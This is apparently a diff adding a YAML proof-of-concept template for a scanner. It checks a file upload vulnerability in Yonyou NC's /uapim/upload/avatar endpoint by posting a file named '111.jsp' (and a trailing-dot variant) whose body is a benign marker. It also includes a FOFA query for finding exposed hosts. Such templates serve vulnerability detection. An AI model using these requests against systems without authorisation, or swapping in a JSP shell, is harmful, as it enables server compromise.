@@ -1,0 +1,41 @@
+id: poc-yaml-yongyou-avatar-upload
+info:
+  name: 用友NC avatar接口文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: POST
+  path: /uapim/upload/avatar?usercode=1&fileType=jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
+  data: '------WebKitFormBoundaryEXmnamw5gVZG9KAQ
+
+    Content-Disposition: form-data; name="file"; filename="111.jsp."
+
+    Content-Type: application/octet-stream
+
+
+    vulnerability
+
+    ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--'
+  expression: "status_code == 200 && \nbody == \"\"\n"
+- method: POST
+  path: /uapim/upload/avatar?usercode=1&fileType=jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
+  data: '------WebKitFormBoundaryEXmnamw5gVZG9KAQ
+
+    Content-Disposition: form-data; name="file"; filename="111.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    vulnerability
+
+    ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--'
+  expression: "status_code == 200 && \nbody == \"true\"\n"
+variables: {}
+transport: http
